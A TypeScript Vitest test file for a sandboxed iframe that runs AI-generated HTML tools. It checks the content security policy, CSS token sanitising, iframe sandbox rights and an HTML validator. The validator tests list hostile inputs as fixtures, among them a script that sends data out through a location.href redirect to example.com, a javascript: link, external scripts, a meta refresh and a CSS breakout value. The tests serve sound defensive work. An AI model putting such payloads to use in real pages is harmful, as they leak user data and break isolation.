import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import {
  AnswerToolFrame,
  TOOL_CSP,
  TOOL_HEIGHT_MESSAGE,
  TOOL_PRINT_BUDGET,
  TOOL_PRINT_MAX_HEIGHT,
  toolPrintScale,
  TOOL_MAX_HTML,
  TOOL_MIN_HEIGHT,
  buildToolDocument,
  readToolHeight,
  toolHtmlProblem,
  toolTokenCss,
} from "@/a2ui/answer-tool";

const CALCULATOR = `<label>Days <input id="d" type="number" value="30"></label><output id="o"></output>
<script>d.oninput = () => { o.textContent = Number(d.value) * 2; }; d.oninput();</script>`;

describe("buildToolDocument", () => {
  it("puts the CSP before every other element", () => {
    const doc = buildToolDocument(CALCULATOR);
    const head = doc.slice(doc.indexOf("<head>") + "<head>".length);
    expect(head.startsWith(`<meta http-equiv="Content-Security-Policy" content="${TOOL_CSP}">`)).toBe(true);
    expect(doc.indexOf(CALCULATOR)).toBeGreaterThan(doc.indexOf("Content-Security-Policy"));
  });

  it("denies network, forms, frames and base changes", () => {
    for (const directive of ["default-src 'none'", "connect-src 'none'", "form-action 'none'", "base-uri 'none'", "frame-src 'none'", "img-src data:"]) {
      expect(TOOL_CSP).toContain(directive);
    }
    expect(TOOL_CSP).not.toMatch(/https?:|\*/);
  });

  it("reports its height after the tool markup", () => {
    const doc = buildToolDocument(CALCULATOR);
    expect(doc.lastIndexOf(TOOL_HEIGHT_MESSAGE)).toBeGreaterThan(doc.indexOf(CALCULATOR));
  });
});

describe("toolTokenCss", () => {
  it("copies plain token values and drops anything that could break out of the rule", () => {
    const css = toolTokenCss({ "--text": " #2D2A24 ", "--accent": "red;}body{background:url(x)", "--radius-control": "10px", "--unknown": "#000" });
    expect(css).toBe(":root{--text:#2D2A24;--radius-control:10px}");
  });

  it("puts the app tokens in the frame document", () => {
    expect(buildToolDocument(CALCULATOR, { "--accent": "#6B5CE7" })).toContain(":root{--accent:#6B5CE7}");
  });
});

describe("toolHtmlProblem", () => {
  it("accepts a self-contained tool, including the word location in text", () => {
    expect(toolHtmlProblem(CALCULATOR)).toBeNull();
    expect(toolHtmlProblem("<label>Pick a location <select><option>Seattle</option></select></label>")).toBeNull();
    expect(toolHtmlProblem('<img src="data:image/png;base64,AAAA" alt="">')).toBeNull();
  });

  it.each([
    ["an external image", '<img src="https://example.com/x.png">'],
    ["a protocol-relative script", '<script src="//cdn.example.com/x.js"></script>'],
    ["a javascript link", '<a href="javascript:alert(1)">x</a>'],
    ["a style url", "<style>body{background:url(https://example.com/a.png)}</style>"],
    ["a nested frame", '<iframe srcdoc="x"></iframe>'],
    ["a meta refresh", '<meta http-equiv="refresh" content="0;url=https://example.com">'],
    ["self navigation", "<script>location.href = 'https://example.com/?d=' + data;</script>"],
    ["window.open", "<script>window.open('https://example.com')</script>"],
    ["fetch", "<script>fetch('/api/x')</script>"],
    ["a handler that navigates", '<button onclick="location=\'https://example.com\'">Go</button>'],
  ])("rejects %s", (_name, html) => {
    expect(toolHtmlProblem(html)).toMatch(/reaches outside/);
  });

  it("rejects empty and oversized tools", () => {
    expect(toolHtmlProblem("  ")).toMatch(/empty/);
    expect(toolHtmlProblem("x".repeat(TOOL_MAX_HTML + 1))).toMatch(/too large/);
  });
});

describe("toolPrintScale", () => {
  it("prints a short tool at full size and shrinks a tall one to fit one page", () => {
    expect(toolPrintScale(400)).toBe(1);
    expect(toolPrintScale(TOOL_PRINT_BUDGET * 2)).toBe(0.5);
  });
});

describe("readToolHeight", () => {
  const frame = {} as Window;

  it("accepts only this frame's height report and clamps it", () => {
    expect(readToolHeight({ source: frame, data: { type: TOOL_HEIGHT_MESSAGE, height: 412.4 } }, frame)).toBe(412);
    expect(readToolHeight({ source: frame, data: { type: TOOL_HEIGHT_MESSAGE, height: 4 } }, frame)).toBe(TOOL_MIN_HEIGHT);
    expect(readToolHeight({ source: frame, data: { type: TOOL_HEIGHT_MESSAGE, height: 99_999 } }, frame)).toBe(TOOL_PRINT_MAX_HEIGHT);
  });

  it("ignores other sources, other messages and bad values", () => {
    expect(readToolHeight({ source: {} as Window, data: { type: TOOL_HEIGHT_MESSAGE, height: 300 } }, frame)).toBeNull();
    expect(readToolHeight({ source: frame, data: { type: "other", height: 300 } }, frame)).toBeNull();
    expect(readToolHeight({ source: frame, data: { type: TOOL_HEIGHT_MESSAGE, height: "300" } }, frame)).toBeNull();
    expect(readToolHeight({ source: frame, data: { type: TOOL_HEIGHT_MESSAGE, height: Number.NaN } }, frame)).toBeNull();
    expect(readToolHeight({ source: frame, data: null }, frame)).toBeNull();
    expect(readToolHeight({ source: frame, data: { type: TOOL_HEIGHT_MESSAGE, height: 300 } }, null)).toBeNull();
  });
});

describe("AnswerToolFrame", () => {
  it("renders an isolated frame with no same-origin, form, popup or navigation rights", () => {
    const html = renderToStaticMarkup(createElement(AnswerToolFrame, { title: "Reorder quantity", html: CALCULATOR, tokens: { "--text": "#2D2A24" } }));
    expect(html).toContain('sandbox="allow-scripts"');
    expect(html).not.toMatch(/allow-(same-origin|forms|popups|top-navigation|modals)/);
    expect(html).toContain('referrerPolicy="no-referrer"');
    expect(html).toContain('allow=""');
    expect(html).toContain("Reorder quantity");
    expect(html).toContain('aria-label="Reload tool"');
  });

  it("shows a reason instead of a frame when the tool reaches out", () => {
    const html = renderToStaticMarkup(createElement(AnswerToolFrame, { title: "Bad", html: "<script>fetch('/x')</script>" }));
    expect(html).not.toContain("<iframe");
    expect(html).toContain("did not run it");
  });
});
